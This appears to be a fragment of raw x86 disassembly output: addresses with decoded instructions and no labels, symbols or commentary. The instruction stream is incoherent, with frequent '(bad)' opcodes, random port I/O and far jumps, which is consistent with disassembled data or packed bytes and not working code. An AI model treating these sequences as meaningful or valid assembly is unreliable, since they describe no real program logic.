  419df3:	xchg   bx,ax
  419df5:	out    dx,eax
  419df6:	and    BYTE PTR [ecx+0x76],ah
  419df9:	push   edx
  419dfa:	and    BYTE PTR [esi],al
  419dfc:	loope  0x419e62
  419dfe:	scas   al,BYTE PTR es:[edi]
  419dff:	scas   eax,DWORD PTR es:[edi]
  419e00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e01:	mov    ebp,0xdd599e8b
  419e06:	fisub  WORD PTR [esi+eiz*8]
  419e09:	ret    0x67e3
  419e0c:	(bad)  
  419e0d:	fnsave [esi+0x279f8fcf]
  419e13:	cmp    BYTE PTR [esi],dl
  419e15:	xor    al,0x73
  419e17:	xor    DWORD PTR [edi],edx
  419e19:	cmp    eax,0xf0b4edd0
  419e1e:	mov    ebp,0x5dfb3212
  419e23:	cld    
  419e24:	or     edi,DWORD PTR [edi]
  419e26:	xchg   BYTE PTR [eax],dl
  419e28:	add    ebx,esi
  419e2a:	ror    DWORD PTR [esi+0x6927b43e],cl
  419e30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e31:	push   ds
  419e32:	pop    eax
  419e33:	dec    ebp
  419e34:	out    0x85,eax
  419e36:	outs   dx,DWORD PTR ds:[esi]
  419e37:	push   ebp
  419e38:	dec    ebx
  419e39:	or     al,0xac
  419e3b:	cli    
  419e3c:	ds inc edx
  419e3e:	cmp    ebp,edx
  419e40:	scas   al,BYTE PTR es:[edi]
  419e41:	jecxz  0x419dd0
  419e43:	jne    0x419ebe
  419e45:	(bad)  
  419e46:	faddp  st(5),st
  419e48:	iret   
  419e49:	jbe    0x419e59
  419e4b:	add    dl,BYTE PTR [edx+0x30c88fc9]
  419e51:	fidivr DWORD PTR [ebp+0x2be3e3ef]
  419e57:	cdq    
  419e58:	jmp    0x873d:0xec0a7714
  419e5f:	(bad)  
  419e60:	aad    0xb8
  419e62:	push   0x10f277e3
  419e67:	(bad)  
  419e68:	mov    ah,0x78
  419e6a:	aad    0x21
  419e6c:	add    al,0x77
  419e6e:	fistp  QWORD PTR [eax]
  419e70:	xchg   ebx,eax
  419e71:	cmp    bh,al
  419e73:	es mov bl,0xd2
  419e76:	sbb    DWORD PTR [ebp-0x7902ed77],edi
  419e7c:	fucomip st,st(4)
  419e7e:	int3   
  419e7f:	gs mov dl,0xce
  419e82:	popa   
  419e83:	ret    0xedaf
  419e86:	pop    ds
  419e87:	stos   BYTE PTR es:[edi],al
  419e88:	fistp  QWORD PTR ds:0x70258669
  419e8e:	xor    eax,0x8e84cb20
  419e93:	push   es
  419e94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e95:	shl    BYTE PTR [edi+0x9fcc2d2],1
  419e9b:	in     eax,dx
  419e9c:	jno    0x419e52
  419e9e:	sbb    eax,0xe7802283
  419ea3:	jmp    0x889a:0x11bac9c
  419eaa:	jns    0x419ebb
  419eac:	mov    ebp,0x244d5b9f
  419eb1:	jno    0x419e87
  419eb3:	(bad)  
  419eb5:	xchg   ebx,eax
  419eb6:	hlt    
  419eb7:	push   esi
  419eb8:	fwait
  419eb9:	pop    ss
  419eba:	or     ecx,DWORD PTR [edi+eax*8]
  419ebd:	mov    dh,0x87
  419ebf:	xchg   BYTE PTR [edx+eax*2-0x46],cl
  419ec3:	mov    ah,0x23
  419ec5:	imul   edi,DWORD PTR [esi+0x758a583c],0xbc8f40f2
  419ecf:	fmul   st,st(0)
  419ed1:	(bad)  
  419ed2:	in     eax,0xea
  419ed4:	retf   0x1b5f
  419ed7:	inc    ebx
  419ed8:	xchg   BYTE PTR [edx+0x3],bh
  419edb:	pop    esp
  419edc:	sub    bh,ah
  419ede:	or     eax,DWORD PTR [ecx-0xb355e64]
  419ee4:	pop    esi
  419ee5:	push   ss
  419ee6:	mov    dl,0x53
  419ee8:	ins    DWORD PTR es:[edi],dx
  419ee9:	or     edx,DWORD PTR es:[edx+0x5]
  419eed:	outs   dx,WORD PTR ds:[esi]
  419eef:	mov    ebp,0x135082b0
  419ef4:	jl     0x419eb3
  419ef6:	ffreep st(1)
  419ef8:	in     al,dx
  419ef9:	push   ss
  419efa:	fwait
  419efb:	in     al,0x28
  419efd:	ins    DWORD PTR es:[edi],dx
  419efe:	enter  0x9588,0xa6
  419f02:	scas   al,BYTE PTR es:[edi]
  419f03:	or     DWORD PTR [edx],esp
  419f05:	cmp    DWORD PTR [ebx-0x44],0xffffffec
  419f09:	add    BYTE PTR [ebp+0x136af8c],dh
  419f0f:	xor    al,0x50
  419f11:	mov    ds:0x5feb3b08,al
  419f16:	or     BYTE PTR ds:[ebp+0x5fe246a5],bl
  419f1d:	mov    eax,DWORD PTR [ebp-0xfbd6cd1]
  419f23:	push   ss
  419f24:	mov    bh,BYTE PTR [eax-0x307025f6]
  419f2a:	leave  
  419f2b:	mov    eax,ds:0x31be7875
  419f30:	mov    ecx,0x28d67b27
  419f35:	adc    ch,cl
  419f37:	mov    eax,0x18359baf
  419f3c:	pop    edx
  419f3d:	or     ah,bh
  419f3f:	pop    esp
  419f40:	std    
  419f41:	es sbb al,0xd0
  419f44:	std    
  419f45:	out    0xae,eax
  419f47:	daa    
  419f48:	jno    0x419eed
  419f4a:	loop   0x419fb0
  419f4c:	ss int 0x44
  419f4f:	sahf   
  419f50:	cmp    eax,0xe22becac
  419f55:	dec    edx
  419f56:	es push cs
  419f58:	jge    0x419fc3
  419f5a:	sub    al,0x89
  419f5c:	arpl   WORD PTR [eax+0x42e56f80],ax
  419f62:	mov    bl,BYTE PTR [edx-0x4f53d7c9]
  419f68:	sub    edx,edx
  419f6a:	jmp    0x6a19:0xa7a3e18e
  419f71:	dec    ebx
  419f72:	push   ds
  419f73:	xchg   edx,eax
  419f74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f75:	mov    ah,0xd4
  419f77:	mov    eax,ds:0x90a60d37
  419f7c:	clc    
  419f7d:	jae    0x419fa5
  419f7f:	sahf   
  419f80:	adc    BYTE PTR [esi+0x5f947d88],bh
  419f86:	mov    WORD PTR [eax+edi*2+0x7ba6cb22],gs
  419f8d:	sub    DWORD PTR [edx-0x2704037f],esp
  419f93:	outs   dx,BYTE PTR ds:[esi]
  419f94:	ffreep st(0)
  419f96:	sbb    BYTE PTR [ebp-0x6a],dl
  419f99:	ret    
  419f9a:	mov    dh,0xfe
  419f9c:	data16 int 0x8a
  419f9f:	test   cl,0x3d
  419fa2:	mov    bh,0x83
  419fa4:	(bad)  
  419fa5:	pop    ebx
  419fa6:	shr    dh,cl
  419fa8:	fcmovbe st,st(2)
  419faa:	xchg   DWORD PTR [edx],esp
  419fac:	mov    dh,0x42
  419fae:	repnz fld QWORD PTR [ebx-0x7f7a9382]
  419fb5:	ins    BYTE PTR es:[edi],dx
  419fb6:	in     eax,0x3f
  419fb8:	push   edi
  419fb9:	push   ss
  419fba:	mov    al,0xb4
  419fbc:	fdivr  QWORD PTR [ecx]
  419fbe:	daa    
  419fbf:	xchg   BYTE PTR [ecx+0x19],bh
  419fc2:	dec    ebx
  419fc3:	push   edi
  419fc4:	(bad)  
  419fc5:	aam    0xfe
  419fc7:	gs pop ss
  419fc9:	mov    bl,0x0
  419fcb:	sbb    DWORD PTR [eax+edx*8+0x74f13354],esi
  419fd2:	xchg   ecx,eax
  419fd3:	fdiv   DWORD PTR [ebx]
  419fd5:	out    0xc4,al
  419fd7:	push   0xda41f91c
  419fdc:	add    al,0xd3
  419fde:	out    dx,al
  419fdf:	mov    ecx,0xdea45d44
  419fe4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419fe5:	lds    eax,FWORD PTR [ebx-0x56]
  419fe8:	dec    edi
  419fe9:	jb     0x419f6f
  419feb:	pop    es
  419fec:	pusha  
  419fed:	pushf  
  419fee:	fstp   QWORD PTR [esi]
  419ff0:	push   0xffffff9f
  419ff2:	ja     0x41a02e
  419ff4:	and    cl,BYTE PTR [ecx+eax*1-0x6c]
  419ff8:	add    DWORD PTR [edi+0x5b],ebx
  419ffb:	test   al,0x0
  419ffd:	push   eax
  419ffe:	xchg   ebp,eax
  419fff:	mov    dh,BYTE PTR [ecx-0x74fff563]
  41a005:	jge    0x41a030
  41a007:	xchg   ebp,eax
  41a008:	(bad)  
  41a009:	hlt    
  41a00a:	cmp    eax,0xc0679c1c
  41a00f:	ins    DWORD PTR es:[edi],dx
  41a010:	je     0x419f92
  41a012:	adc    al,0x1e
  41a014:	mov    al,ds:0x7193b385
  41a019:	jl     0x419fea
  41a01b:	into   
  41a01c:	repnz (bad) 
  41a01e:	stc    
  41a01f:	cmp    ebp,DWORD PTR [ebp-0x5904a832]
  41a025:	mov    dl,0xeb
  41a027:	jns    0x41a09d
  41a029:	push   cs
  41a02a:	push   edi
  41a02b:	imul   eax,DWORD PTR [edx+0x746d6fe3],0xffffff85
  41a032:	xchg   esi,eax
  41a033:	or     BYTE PTR [ecx-0x6b],bl
  41a036:	fdiv   st,st(4)
  41a038:	ret    
  41a039:	ss mov ch,0x3
  41a03c:	test   eax,0xbb3fca30
  41a041:	lods   eax,DWORD PTR ds:[esi]
  41a042:	call   0x8920:0x6204d61e
  41a049:	fnstsw WORD PTR [ebx-0x11686963]
  41a04f:	pop    es
  41a050:	loop   0x419fdf
  41a052:	ret    0xfae6
  41a055:	cwde   
  41a056:	pop    es
  41a057:	inc    ebx
  41a058:	in     al,dx
  41a059:	mov    ch,0xc2
  41a05b:	add    al,0x38
  41a05d:	xor    al,0x26
  41a05f:	outs   dx,DWORD PTR ds:[esi]
  41a060:	test   ebp,esp
  41a062:	(bad)  
  41a063:	sub    al,0xaa
  41a065:	scas   al,BYTE PTR es:[edi]
  41a066:	or     DWORD PTR ds:0x1da86934,eax
  41a06c:	(bad)  
  41a06e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a06f:	imul   esp,ebx,0x72f4709e
  41a075:	adc    esp,DWORD PTR [ebp+0x19c27f9d]
  41a07b:	add    al,0x1f
  41a07d:	and    esp,DWORD PTR [edi-0x39]
  41a080:	std    
  41a081:	into   
  41a082:	mov    edx,0x4c2cdc1f
  41a087:	stc    
  41a088:	js     0x41a07d
  41a08a:	sti    
  41a08b:	mov    esi,0x66e3a8f1
  41a090:	das    
  41a091:	sub    eax,DWORD PTR [eax-0x74307908]
  41a097:	jmp    0x41a0f6
  41a099:	jg     0x41a083
  41a09b:	pop    edi
  41a09c:	adc    al,0x4b
  41a09e:	and    al,BYTE PTR [ebx+0x1d7b19b3]
  41a0a4:	dec    ebp
  41a0a5:	pop    eax
  41a0a6:	scas   eax,DWORD PTR es:[edi]
  41a0a7:	data16 int3 
  41a0a9:	sar    dh,cl
  41a0ab:	cmp    DWORD PTR [edx+0x3ab3f4d0],ecx
  41a0b1:	xchg   edx,eax
  41a0b2:	and    al,0xe6
  41a0b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a0b5:	or     ebp,edx
  41a0b7:	addr16 (bad) 
  41a0b9:	sbb    al,0x14
  41a0bb:	xor    bl,BYTE PTR [esi-0x71]
  41a0be:	push   0x417bbdda
  41a0c3:	add    ebx,DWORD PTR [eax]
  41a0c5:	mov    ss,WORD PTR [eax+edx*4]
  41a0c8:	push   esp
  41a0c9:	mov    BYTE PTR [ecx+0x2cf0a956],cl
  41a0cf:	cmp    al,0x5d
  41a0d1:	out    0xa1,eax
  41a0d3:	call   0x8998:0x85d1a990
  41a0da:	icebp  
  41a0db:	xor    al,0x88
  41a0dd:	popa   
  41a0de:	mov    edx,0xf07751c8
  41a0e3:	das    
  41a0e4:	mov    al,ds:0xf5ed302c
  41a0e9:	outs   dx,BYTE PTR ds:[esi]
  41a0ea:	fnstcw WORD PTR [ebp+0x7c4914bc]
  41a0f0:	idiv   BYTE PTR [ebp-0x45609616]
  41a0f6:	push   esi
  41a0f7:	jmp    0xabe3:0x5568054e
  41a0fe:	call   0xc5dc:0x2fbd59cd
  41a105:	nop
  41a106:	daa    
  41a107:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a108:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a109:	xor    edx,DWORD PTR [eax+0x3095753c]
  41a10f:	push   ds
  41a110:	repz adc BYTE PTR [edx-0x8beff81],0xd3
  41a118:	push   0xac9854a7
  41a11d:	add    BYTE PTR [ebp+0x1e],0xcc
  41a121:	ret    0x554a
  41a124:	lea    edx,ds:0xf24ac131
  41a12a:	jnp    0x41a163
  41a12c:	adc    eax,0xe44e128a
  41a131:	ret    
  41a132:	dec    ebx
  41a133:	test   al,0x17
  41a135:	outs   dx,DWORD PTR ds:[esi]
  41a136:	cmc    
  41a137:	mov    al,0x91
  41a139:	mov    edx,0xf4e6f65d
  41a13e:	jmp    0x7342:0xd99a0ba7
  41a145:	neg    BYTE PTR [ebx]
  41a147:	push   ds
  41a148:	sub    eax,0x88f90ccd
  41a14d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a14e:	les    eax,FWORD PTR [esi]
  41a150:	rcl    BYTE PTR [ebx],cl
  41a152:	mov    ds:0x8fa5bceb,eax
  41a157:	cmp    BYTE PTR [ebp+ebx*8-0x2eb14f7],bl
  41a15e:	ins    DWORD PTR es:[edi],dx
  41a15f:	(bad)  
  41a160:	stos   DWORD PTR es:[edi],eax
  41a161:	and    BYTE PTR [ebp+0x31b7064f],ch
  41a167:	and    eax,0x14d5e282
  41a16c:	imul   esp,DWORD PTR [ecx],0xa9e83a54
  41a172:	fst    DWORD PTR [edx-0x329c1daf]
  41a178:	push   esi
  41a179:	rol    DWORD PTR [edx+0x7ef9b7ef],1
  41a17f:	and    al,0x2a
  41a181:	jmp    0x271a:0xf915df56
  41a188:	inc    ecx
  41a189:	std    
  41a18a:	mov    cs,esp
  41a18c:	sar    BYTE PTR [esi*1+0x48daff49],1
  41a193:	or     DWORD PTR [eax-0x37990777],ebp
  41a199:	push   cs
  41a19a:	ffreep st(7)
  41a19c:	mov    ebp,0x9031f4bd
  41a1a1:	aam    0xbb
  41a1a3:	fmul   DWORD PTR [edi-0x16537b65]
  41a1a9:	jg     0x41a22a
  41a1ab:	pop    fs
  41a1ad:	idiv   DWORD PTR [esi+0x7e]
  41a1b0:	push   eax
  41a1b1:	mov    BYTE PTR [ebx+0x4b1b4ac8],bl
  41a1b7:	gs inc esi
  41a1b9:	mov    ebp,0xfce43d11
  41a1be:	xchg   BYTE PTR [edx-0x60f16058],ch
  41a1c4:	hlt    
  41a1c5:	aas    
  41a1c6:	lds    esp,FWORD PTR [edi+0x2d216c0e]
  41a1cc:	push   edi
  41a1cd:	xor    DWORD PTR [ecx+eax*4+0xe],ebp
  41a1d1:	arpl   WORD PTR [esi],si
  41a1d3:	fld    QWORD PTR [eax-0x73e6b7bc]
  41a1d9:	or     BYTE PTR [edi],0x7e
  41a1dc:	add    esi,DWORD PTR [ecx-0x3cb3435d]
  41a1e2:	in     eax,dx
  41a1e3:	or     eax,0x4eadbc63
  41a1e8:	sti    
  41a1e9:	cs mov edi,0xeb6fe678
  41a1ef:	arpl   WORD PTR [edx-0x7a],sp
  41a1f2:	loopne 0x41a221
  41a1f4:	dec    ebp
  41a1f5:	mov    al,0xd
  41a1f7:	inc    esp
  41a1f8:	cmp    edi,DWORD PTR [edi+0x4e645023]
  41a1fe:	inc    ebx
  41a1ff:	pop    ecx
  41a200:	xor    al,0x8a
  41a202:	daa    
  41a203:	mov    dh,0xe3
  41a205:	leave  
  41a206:	mov    eax,ds:0x14f53f98
  41a20b:	retf   
  41a20c:	sub    esi,0xffffff8a
  41a20f:	sahf   
  41a210:	or     ecx,DWORD PTR [ecx-0x7d4d219a]
  41a216:	mov    WORD PTR [eax-0x4d1c3564],cs
  41a21c:	(bad)  
  41a21d:	repnz (bad) 
  41a21f:	or     eax,0xa2146ea9
  41a224:	loop   0x41a28f
  41a226:	xchg   BYTE PTR [esi],ah
  41a228:	pop    ebx
  41a229:	in     eax,0xf
  41a22b:	push   ebp
  41a22c:	(bad)  
  41a22e:	pop    ebp
  41a22f:	popa   
  41a230:	xchg   BYTE PTR [ebx+0x53],ch
  41a233:	and    ebp,esp
  41a235:	mov    ds:0x4d2f3972,al
  41a23a:	xor    BYTE PTR [edx+eax*2],bl
  41a23d:	pop    edx
  41a23e:	daa    
  41a23f:	mov    dh,0xb9
  41a241:	mov    ah,0xb3
  41a243:	pop    eax
  41a244:	out    dx,al
  41a245:	mov    edi,0xbaed849
  41a24a:	ja     0x41a241
  41a24c:	mov    dh,0x34
  41a24e:	adc    ebp,0xa719c670
  41a254:	pop    ebp
  41a255:	and    cl,cl
  41a257:	lea    esi,[edi+0x11]
  41a25a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a25b:	pop    es
  41a25c:	pop    es
  41a25d:	les    edx,FWORD PTR [esi-0x21250a25]
  41a263:	enter  0x663c,0x6e
  41a267:	mov    al,ds:0x97030cb5
  41a26c:	push   0xda34980f
  41a271:	nop
  41a272:	pop    ebp
  41a273:	sti    
  41a274:	imul   ebx,DWORD PTR [esi-0x69c22d34],0x53
  41a27b:	add    bl,BYTE PTR [edi+eiz*2-0xafb9a6c]
  41a282:	fwait
  41a283:	arpl   WORD PTR [ecx-0x27],sp
  41a286:	rol    DWORD PTR [ebp+ebp*4+0x553895fa],1
  41a28d:	cmp    eax,0xa2100061
  41a292:	imul   DWORD PTR [ebx+edx*8+0x2d0962ba]
  41a299:	mov    esi,DWORD PTR [edx-0x34]
  41a29c:	out    dx,al
  41a29d:	mov    ch,0xc8
  41a29f:	cli    
  41a2a0:	xchg   ebx,eax
  41a2a1:	mov    edx,0xd5ccf193
  41a2a6:	push   edx
  41a2a7:	pushf  
  41a2a8:	shl    ebx,cl
  41a2aa:	mov    ds:0x7c0c7824,eax
  41a2af:	dec    ebp
  41a2b0:	cdq    
  41a2b1:	push   ebp
  41a2b2:	mov    ah,0x55
  41a2b4:	fbstp  TBYTE PTR [edi-0x179fe241]
  41a2ba:	xchg   esp,eax
  41a2bb:	inc    ebx
  41a2bc:	ret    
  41a2bd:	into   
  41a2be:	(bad)  
  41a2bf:	push   eax
  41a2c0:	sub    eax,0xfdacddbe
  41a2c5:	shl    BYTE PTR [ecx],cl
  41a2c7:	ror    DWORD PTR [eax-0x7b],1
  41a2ca:	or     DWORD PTR [ecx],esp
  41a2cc:	or     al,0x6d
  41a2ce:	jns    0x41a2f7
  41a2d0:	jecxz  0x41a321
  41a2d2:	popa   
  41a2d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a2d4:	inc    ecx
  41a2d5:	test   DWORD PTR [ecx-0x24],esp
  41a2d8:	cmp    BYTE PTR [esi+ebp*8],bh
  41a2db:	outs   dx,BYTE PTR ds:[esi]
  41a2dc:	out    dx,eax
  41a2dd:	add    al,0x52
  41a2df:	test   eax,0x9c953af4
  41a2e4:	ds mov esp,0x2cef4471
  41a2ea:	fucomi st,st(2)
  41a2ec:	rcr    DWORD PTR [esi-0xe85a75b],0x60
  41a2f3:	xchg   ecx,eax
  41a2f4:	inc    esi
  41a2f5:	in     eax,0x79
  41a2f7:	cmp    BYTE PTR [ecx],dh
  41a2f9:	inc    ecx
  41a2fa:	cs jbe 0x41a2cd
  41a2fd:	or     eax,0x20879f6a
  41a302:	add    al,0xfd
  41a304:	dec    esi
  41a305:	inc    edi
  41a306:	sbb    DWORD PTR [ebx-0x14d14135],eax
  41a30c:	fadd   QWORD PTR [ebx+0x13603bec]
  41a312:	mov    ah,0x10
  41a314:	dec    eax
  41a315:	inc    edx
  41a316:	xchg   DWORD PTR [ebx],eax
  41a318:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a319:	add    al,0x66
  41a31b:	xor    BYTE PTR [ecx+0x6c],bh
  41a31e:	lahf   
  41a31f:	push   edx
  41a320:	push   ecx
  41a321:	mov    ds:0x4f78fa19,al
  41a326:	sbb    ebx,ecx
  41a328:	mov    bh,0x2b
  41a32a:	sub    ecx,ebp
  41a32c:	or     eax,0x1498727f
  41a331:	jg     0x41a3a5
  41a333:	pop    ss
  41a334:	and    ecx,ebx
  41a336:	ret    
  41a337:	out    0x6d,al
  41a339:	xchg   ecx,eax
  41a33a:	cwde   
  41a33b:	stc    
  41a33c:	(bad)
  41a33f:	cld    
  41a340:	mov    eax,0x1f176be9
  41a345:	mov    ds:0x6f39bae,al
  41a34a:	jmp    0x598d:0xe0f3e25
  41a351:	(bad)  
  41a352:	mov    DWORD PTR [edi-0x6d912875],esp
  41a358:	jno    0x41a332
  41a35a:	cmp    al,0x52
  41a35c:	adc    dh,BYTE PTR [eax-0x4a]
  41a35f:	popf   
  41a360:	jp     0x41a36d
  41a362:	pop    ebp
  41a363:	call   0x20b0:0x39f3501
  41a36a:	inc    esp
  41a36b:	sbb    al,0x4d
  41a36d:	sub    BYTE PTR [ebp+ebx*4-0xe],al
  41a371:	xor    BYTE PTR [edi],cl
  41a373:	jb     0x41a327
  41a375:	push   ss
  41a376:	idiv   DWORD PTR [edx-0x12]
  41a379:	outs   dx,DWORD PTR ds:[esi]
  41a37a:	cwde   
  41a37b:	ret    0x6568
  41a37e:	adc    dl,BYTE PTR [ecx+0x2538adb3]
  41a384:	pop    ds
  41a385:	mov    bl,0xbf
  41a387:	sub    BYTE PTR [ebp+0x14],dl
  41a38a:	push   esi
  41a38b:	cwde   
  41a38c:	jnp    0x41a3c4
  41a38e:	retf   
  41a38f:	lock mov bh,0x3c
  41a392:	nop
  41a393:	std    
  41a394:	enter  0x31b5,0x53
  41a398:	mov    al,0x2b
  41a39a:	dec    esp
  41a39b:	cmc    
  41a39c:	cmc    
  41a39d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a39e:	ins    BYTE PTR es:[edi],dx
  41a39f:	ror    BYTE PTR [esi],cl
  41a3a1:	cwde   
  41a3a2:	push   ebp
  41a3a3:	fldenv [edx-0x42e8ace1]
  41a3a9:	pop    ecx
  41a3aa:	sub    dl,0x8
  41a3ad:	aas    
  41a3ae:	pop    ecx
  41a3af:	sbb    cl,BYTE PTR [edi+0x28]
  41a3b2:	mov    esi,0x882abd62
  41a3b7:	push   ebp
  41a3b8:	mov    al,ds:0xc07e2e1a
  41a3be:	mulps  xmm7,XMMWORD PTR [eax]
  41a3c1:	retf   
  41a3c2:	xlat   BYTE PTR ds:[ebx]
  41a3c3:	or     DWORD PTR ds:0xfe9a4633,esp
  41a3c9:	mov    al,0x11
  41a3cb:	cwde   
  41a3cc:	mov    ebx,ebx
  41a3ce:	jl     0x41a3ce
  41a3d0:	(bad)
  41a3d3:	mov    bh,0x81
  41a3d5:	dec    eax
  41a3d6:	std    
  41a3d7:	pop    esi
  41a3d8:	mov    al,0x69
  41a3da:	jecxz  0x41a3c8
  41a3dc:	in     eax,dx
  41a3dd:	iret   
  41a3de:	xchg   edx,eax
  41a3df:	or     DWORD PTR [ebp-0x65fe787d],0x11f7ea26
  41a3e9:	popf   
  41a3ea:	icebp  
  41a3eb:	jb     0x41a39c
  41a3ed:	test   BYTE PTR [eax],bh
  41a3ef:	loop   0x41a426
  41a3f1:	fs ret 
  41a3f3:	pop    ebx
  41a3f4:	xchg   ebp,eax
  41a3f5:	xchg   edx,eax
  41a3f6:	inc    eax
  41a3f7:	stos   BYTE PTR es:[edi],al
  41a3f8:	mov    dh,0x5
  41a3fa:	sbb    DWORD PTR [esi+0x2e],ebp
  41a3fd:	cli    
  41a3fe:	mov    edi,0x23c67dcc
  41a403:	add    eax,0x54cc6148
  41a408:	mov    eax,ds:0xb2311c
  41a40d:	dec    eax
  41a40e:	xor    BYTE PTR [ebx+0x70],dh
  41a411:	sub    al,0x46
  41a413:	(bad)  
  41a414:	aad    0x2c
  41a416:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a417:	pop    ds
  41a418:	xor    eax,0xfe969d8f
  41a41d:	clc    
  41a41e:	pushf  
  41a41f:	pushf  
  41a420:	push   cs
  41a421:	push   edi
  41a422:	push   eax
  41a423:	and    al,0xe7
  41a425:	clc    
  41a426:	or     bl,BYTE PTR [edi]
  41a428:	inc    ebx
  41a429:	aas    
  41a42a:	lahf   
  41a42b:	mov    ecx,0xc21da3fb
  41a430:	sbb    dh,BYTE PTR [esi+0x5ba37b4a]
  41a436:	lea    edi,[edx-0x63]
  41a439:	sub    al,0x71
  41a43b:	adc    ebp,esi
  41a43d:	shr    DWORD PTR [eax-0x14dfb7aa],1
  41a443:	mov    ch,0x35
  41a445:	retf   0x3450
  41a448:	mov    esi,ecx
  41a44a:	rcr    BYTE PTR [esp+edi*4+0x1e],0x37
  41a44f:	adc    al,0xb8
  41a451:	sbb    eax,0x7132d2aa
  41a456:	push   eax
  41a457:	jge    0x41a479
  41a459:	icebp  
  41a45a:	jno    0x41a3f8
  41a45c:	pop    ecx
  41a45d:	pop    ss
  41a45e:	sbb    esp,DWORD PTR [ecx]
  41a460:	sub    eax,0x337e1eb3
  41a465:	loopne 0x41a4c6
  41a467:	push   edx
  41a468:	test   al,0x4d
  41a46a:	sahf   
  41a46b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a46c:	enter  0x540b,0x78
  41a470:	pushf  
  41a471:	sub    al,0x20
  41a473:	cmp    ecx,DWORD PTR [esi+0x68]
  41a476:	out    dx,eax
  41a477:	shr    dh,cl
  41a479:	sbb    ah,BYTE PTR cs:[ebx]
  41a47c:	lea    eax,ds:0xcd5a6d22
  41a482:	push   es
  41a483:	(bad)  
  41a486:	test   eax,0xb59825b0
  41a48b:	ins    DWORD PTR es:[edi],dx
  41a48c:	dec    ebx
  41a48d:	pop    es
  41a48e:	adc    al,0x33
  41a490:	aad    0xe2
  41a492:	push   ebp
  41a493:	in     al,dx
  41a494:	push   esp
  41a495:	or     al,0x8e
  41a497:	retf   
  41a498:	push   es
  41a499:	xor    al,0x6f
  41a49b:	jl     0x41a4d9
  41a49d:	je     0x41a4b5
  41a49f:	xchg   ebx,eax
  41a4a0:	(bad)  
  41a4a1:	xchg   ebp,eax
  41a4a2:	mov    ds:0x2cba10e4,eax
  41a4a7:	fcomp  QWORD PTR [edx]
  41a4a9:	aad    0x95
  41a4ab:	pop    esi
  41a4ac:	sar    DWORD PTR [edx+0x7f695d2d],0xc9
  41a4b3:	imul   eax,esi,0xb034deff
  41a4b9:	ds xchg ecx,eax
  41a4bb:	jns    0x41a49b
  41a4bd:	shl    eax,cl
  41a4bf:	shr    cl,0xbf
  41a4c2:	jle    0x41a504
  41a4c4:	scas   eax,DWORD PTR es:[edi]
  41a4c5:	call   0x46f5:0x3f3aea4e
  41a4cc:	push   ebp
  41a4cd:	push   ss
  41a4ce:	cmp    eax,0x7a31842a
  41a4d3:	jo     0x41a506
  41a4d5:	cmc    
  41a4d6:	sbb    ch,ch
  41a4d8:	lock xchg esi,eax
  41a4da:	or     edx,DWORD PTR [ebx+0x70e8f7e2]
  41a4e0:	icebp  
  41a4e1:	pushf  
  41a4e2:	mov    gs,WORD PTR [esi]
  41a4e4:	mov    dh,0x4f
  41a4e6:	fldlg2 
  41a4e8:	into   
  41a4e9:	or     eax,0x91f6f491
  41a4ee:	mov    gs,WORD PTR [edi]
  41a4f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a4f1:	xchg   ebp,eax
  41a4f2:	dec    edi
  41a4f3:	jmp    0x41a50b
  41a4f5:	test   BYTE PTR [esi+ecx*4-0x1c56087f],ch
  41a4fc:	pop    ebp
  41a4fd:	xchg   edi,eax
  41a4fe:	add    al,0xc5
  41a500:	or     BYTE PTR [eax],bl
  41a502:	xor    esp,eax
  41a504:	call   0x3e10:0x5263c41c
  41a50b:	sub    esp,ebx
  41a50d:	shl    DWORD PTR [ebp-0x71574987],0xe
  41a514:	ins    DWORD PTR es:[edi],dx
  41a515:	inc    ecx
  41a516:	gs (bad) 
  41a519:	repnz addr16 mov cl,0x3d
  41a51d:	cli    
  41a51e:	imul   bp,WORD PTR [edi+0x64],0x6a
  41a523:	popa   
  41a524:	fidivr DWORD PTR ds:0x8d0cb7f
  41a52a:	pop    ds
  41a52b:	push   ecx
  41a52c:	adc    eax,DWORD PTR [ecx-0x3b3fc4e]
  41a532:	mov    ebx,0xcc327a59
  41a537:	int3   
  41a538:	cs sub al,0x7e
  41a53b:	stc    
  41a53c:	jecxz  0x41a5b6
  41a53e:	add    BYTE PTR ds:0xf12c39f7,0x2c
  41a545:	(bad)  
  41a546:	push   edi
  41a547:	jg     0x41a596
  41a549:	rcr    ah,0xef
  41a54c:	data16 mov ah,0x93
  41a54f:	xchg   ebp,eax
  41a550:	xor    eax,0x10a98699
  41a555:	cdq    
  41a556:	jle    0x41a59d
  41a558:	jno    0x41a5c3
  41a55a:	and    cl,dh
  41a55c:	adc    eax,0x6bd7ef12
  41a561:	enter  0x3398,0xa5
  41a565:	(bad)  
  41a566:	push   ecx
  41a567:	adc    dh,al
  41a569:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a56a:	or     cl,BYTE PTR [ebp-0x79]
  41a56d:	sub    ebp,edx
  41a56f:	xor    DWORD PTR [ebx-0x16],esi
  41a572:	inc    ecx
  41a573:	sub    dh,BYTE PTR [edi-0x63238e86]
  41a579:	push   esi
  41a57a:	(bad)  
  41a57b:	fdivr  QWORD PTR [edx-0x5b2506c8]
  41a581:	dec    edx
  41a582:	jge    0x41a54d
  41a584:	or     ch,BYTE PTR ds:0x7474c047
  41a58a:	mov    ds:0x3abb6b7b,al
  41a58f:	pushf  
  41a590:	add    ebx,DWORD PTR [edi-0xd]
  41a593:	mov    ds:0x958a9f3f,eax
  41a598:	fst    DWORD PTR [ebx-0x1]
  41a59b:	mov    cl,0x64
  41a59d:	push   ds
